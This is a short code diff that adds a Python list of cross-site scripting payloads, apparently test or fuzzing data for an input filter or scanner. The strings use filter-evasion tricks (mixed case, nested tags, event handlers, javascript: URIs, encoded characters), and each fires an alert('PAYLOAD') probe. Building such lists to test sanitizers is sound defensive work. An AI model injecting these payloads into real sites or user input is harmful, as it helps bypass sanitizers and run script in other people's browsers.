@@ -1,0 +1,27 @@
+[
+            r"<script>alert('PAYLOAD')</script>",
+            r"\\\";alert('PAYLOAD');//",
+            r"</TITLE><SCRIPT>alert('PAYLOAD');</SCRIPT>",
+            r"<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('PAYLOAD');\">",
+            r"<BR SIZE=\"&{alert('PAYLOAD')}\">",
+            r"<%<!--'%><script>alert('PAYLOAD');</script -->",
+            r"<ScRiPt>alErT('PAYLOAD')</sCriPt>",
+            r"<IMG SRC=jAVasCrIPt:alert('PAYLOAD')>",
+            r"<img src=1 href=1 onerror=\"javascript:alert('PAYLOAD')\"></img>",
+            r"<applet onError applet onError=\"javascript:javascript:alert"
+            + r"('PAYLOAD')\"></applet onError>",
+            r"<scr<script>ipt>alert('PAYLOAD')</scr</script>ipt>",
+            r"<<SCRIPT>alert('PAYLOAD');//<</SCRIPT>",
+            r"<embed code=javascript:javascript:alert('PAYLOAD');></embed>",
+            r"<BODY onload!#$%%&()*~+-_.,:;?@[/|\\]^`=javascript:"
+            + r"alert('PAYLOAD')>",
+            r"<BODY ONLOAD=javascript:alert('PAYLOAD')>",
+            r"<img src=\"javascript:alert('PAYLOAD')\">",
+            r"\"`'><script>\\x21javascript:alert('PAYLOAD')</script>",
+            r"`\"'><img src='#\\x27 onerror=javascript:alert('PAYLOAD')>",
+            r"alert;pg('PAYLOAD')",
+            r"¼script¾alert(¢PAYLOAD¢)¼/script¾",
+            r"d=\\\"alert('PAYLOAD');\\\\\")\\\";",
+            r"&lt;DIV STYLE=\\\"background-image&#58; url(javascript&#058;"
+            + r"alert('PAYLOAD'))\\\"&gt;",
+        ]
